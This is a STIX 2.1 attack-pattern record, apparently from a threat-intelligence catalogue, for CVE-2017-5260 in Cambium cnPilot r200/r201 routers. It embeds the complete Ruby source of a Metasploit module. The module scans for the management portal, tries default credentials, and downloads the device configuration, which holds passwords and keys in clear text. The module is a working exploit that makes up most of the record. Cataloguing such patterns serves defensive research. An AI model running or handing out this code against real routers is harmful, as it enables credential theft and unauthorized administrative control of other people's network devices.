{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7a5d4388-736d-45cd-9f89-92bda26c9a79",
    "created": "2024-08-14T16:28:33.151158Z",
    "modified": "2024-08-14T16:28:33.151162Z",
    "name": "Cambium cnPilot r200/r201 Login Scanner and Config Dump",
    "description": " This module scans for Cambium cnPilot r200/r201 management login portal(s), attempts to identify valid credentials, and dump device configuration.  The device has at least two (2) users - admin and user. Due to an access control vulnerability, it is possible for 'user' account to access full device config. All information, including passwords, and keys, is stored insecurely, in clear-text form, thus allowing unauthorized admin access to any user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cnpilot_r_web_login_loot.rb",
            "external_id": "cnpilot_r_web_login_loot.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5260"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::CNPILOT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Cambium cnPilot r200/r201 Login Scanner and Config Dump',\n      'Description' => %{\n        This module scans for Cambium cnPilot r200/r201 management login\n        portal(s), attempts to identify valid credentials, and dump device\n        configuration.\n\n        The device has at least two (2) users - admin and user. Due to an\n        access control vulnerability, it is possible for 'user' account to access full\n        device config. All information, including passwords, and keys, is stored\n        insecurely, in clear-text form, thus allowing unauthorized admin access to any\n        user.\n      },\n      'Author' =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'References' =>\n        [\n          ['CVE', '2017-5260'],\n          ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']\n        ],\n      'License' => MSF_LICENSE\n     )\n    )\n\n    register_options(\n      [\n        OptInt.new('TIMEOUT', [true, 'HTTP connection timeout', 10]),\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'user']),\n        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'user'])\n      ], self.class\n    )\n  end\n\n  def run_host(ip)\n    unless is_app_cnpilot?\n      return\n    end\n  end\n\n  #\n  # Login & initiate dump_config\n  #\n\n  def run_login\n    each_user_pass do |user, pass|\n      cookie = do_login(user, pass)\n      if cookie == 'skip'\n        # do nothing\n      else\n        dump_config(cookie)\n      end\n    end\n  end\n\n  #\n  # Dump device configuration\n  #\n\n  def dump_config(the_cookie)\n    res = send_request_cgi(\n      {\n        'uri' => '/goform/down_cfg_file',\n        'method' => 'GET',\n        'cookie' => the_cookie,\n        'headers' => {\n          'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'\n        }\n      }\n    )\n\n    if res && res.code == 200 && res.headers['content-disposition']\n      print_status(\"#{rhost}:#{rport} - dumping device configuration\")\n      print_good(\"#{rhost}:#{rport} - Configfile.cfg retrieved successfully!\")\n      loot_name = 'Configfile.cfg'\n      loot_type = 'text/plain'\n      loot_desc = 'Cambium cnPilot Config'\n      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body, loot_desc)\n      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")\n    else\n      print_error(\"#{rhost}:#{rport} - Failed to retrieve config. Set a higher HTTPCLIENTTIMEOUT and try again.\")\n      return\n    end\n  end\nend\n"
}